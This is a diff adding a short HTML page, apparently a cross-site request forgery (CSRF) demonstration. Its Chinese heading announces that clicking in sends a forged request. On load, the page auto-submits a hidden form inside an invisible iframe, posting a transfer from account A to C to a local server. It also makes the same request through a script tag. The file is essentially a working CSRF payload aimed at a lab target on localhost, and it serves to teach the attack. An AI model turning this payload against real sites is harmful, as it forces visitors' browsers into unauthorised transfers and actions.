@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>伪造的网站</title>
+  <style>
+    html,body { 
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+  </style>
+</head>
+<body>
+  <h1>你点进来就发送跨站伪造请求了</h1>
+
+  <iframe style="display: none;" name="csrf-frame">
+    
+  </iframe>
+
+  <form method="post" action="http://localhost:9000/transform" target="csrf-frame" id="csrf-form">
+    <input type="hidden"  name="to" value="C"/>
+    <input type="hidden"  name="from" value="A"/>
+    <input type="submit"  value="submit"/>
+  </form>
+
+  <script>
+      document.getElementById('csrf-form').submit()
+  </script>
+  <script src="http://localhost:9000/transform?from=A&to=C"></script>
+</body>
+</html>
